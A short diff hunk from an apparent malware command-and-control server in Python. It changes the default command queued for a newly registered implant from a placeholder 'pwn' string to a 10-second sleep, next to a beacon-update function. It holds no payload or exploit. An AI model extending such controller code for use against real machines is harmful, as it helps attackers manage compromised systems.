@@ -18,7 +18,7 @@ def add_malware(malware_entry):
     open(f"{directory}/logs.txt", "x")
 
     with open (f"{directory}/commands.txt", "w") as f:
-        f.write("pwn:HIHIHIHIHIHIIHIHIHIHIHIHIHI")
+        f.write("slp:10")
 
 def update_becon(id, timestamp):
 
